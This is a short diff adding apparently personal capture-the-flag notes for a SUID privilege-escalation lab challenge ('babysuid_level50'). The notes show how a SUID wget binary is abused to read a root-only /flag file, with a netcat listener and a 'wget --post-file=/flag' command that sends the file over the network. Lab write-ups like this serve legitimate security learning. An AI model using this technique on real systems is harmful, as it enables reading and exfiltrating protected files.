@@ -1,0 +1,4 @@
+Read the challenge file using /challenge/babysuid_level50
+Check SUID permissions using ls -la /challenge/babysuid_level50.  
+Try to read the flag file as /usr/bin/wget /flag but the flag will not show. 
+nc -lp 8888 & wget --post-file=/flag http://127.0.0.1:8888 
